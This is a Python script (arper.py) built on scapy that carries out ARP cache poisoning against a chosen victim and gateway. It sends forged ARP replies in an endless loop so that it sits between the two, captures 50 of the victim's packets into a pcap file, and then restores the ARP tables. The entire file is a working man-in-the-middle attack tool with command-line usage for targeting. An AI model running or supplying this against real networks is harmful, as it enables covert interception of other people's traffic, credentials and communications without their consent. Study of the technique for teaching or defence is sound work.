from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sendp, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

def get_mac(targetip):
    '''Helper function, gets MAC addresses of any machine'''
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst = targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='eth0'): ## Change your interface by need i.e for Mac en0
        self.victim = victim
        self.victimmac = get_mac(victim)
        if not self.victimmac:
            print(f"ERROR Could not get MAC address for victim: {victim}")
            sys.exit(1)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        if not self.gatewaymac:
            print(f"[ERROR] Could not get MAC address for gateway: {gateway}")
            sys.exit(1)
        self.interface = interface
        self.iface = interface
        conf.verb = 0
        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway}) is at ({self.gatewaymac}).')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('='*30)

    def run(self):
        '''Sets up poison_thread and sniff_thread, one to poison the network
            and the other to watch the attack take place'''
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        attacker_mac = get_if_hwaddr(self.interface)
        poison_victim = ARP(
            op = 2,
            psrc = self.gateway,
            pdst = self.victim,
            hwdst = self.victimmac,
            hwsrc = attacker_mac
        )
        print(f'IP src: {poison_victim.psrc}')
        print(f'IP dst: {poison_victim.pdst}')
        print(f'MAC dst: {poison_victim.hwdst}')
        print(f'MAC src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print("="*30)
        poison_gateway = ARP(
            op=2,
            psrc=self.victim,  # Pretend to be the victim
            pdst=self.gateway,  # Target gateway
            hwdst=self.gatewaymac,  # Gateway's real MAC
            hwsrc=attacker_mac  # Attacker's MAC
        )

        print(f'IP src: {poison_gateway.psrc}')
        print(f'IP dst: {poison_gateway.pdst}')
        print(f'MAC dst: {poison_gateway.hwdst}')
        print(f'MAC src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print("="*30)
        print(f'Beginning poisoning...')
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                sendp(poison_victim, iface=self.interface, verbose=False)
                sendp(poison_gateway, iface=self.interface, verbose=False)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)


    def sniff(self, count=50):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" % victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print("Packets Captured")
        self.restore()
        self.poison_thread.terminate()
        print('Finished')   
        
    def restore(self):
        print ('Restoring ARP tables....')
        
        attacker_mac = get_if_hwaddr(self.interface)

        restore_victim = Ether(dst=self.victimmac) / ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst=self.victimmac
        )

        restore_gateway = Ether(dst=self.gatewaymac) / ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst=self.gatewaymac
        )
        
        sendp(restore_victim, iface=self.interface, count=5, verbose=False)
        sendp(restore_gateway, iface=self.interface, count=5, verbose=False)

if __name__ == '__main__':
    try:
        (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
        myarp = Arper(victim, gateway, interface)
        myarp.run()
    except IndexError:
        print("Usage: ./arper.py <TARGET_IP> <ROUTER_IP> <INTERFACE>")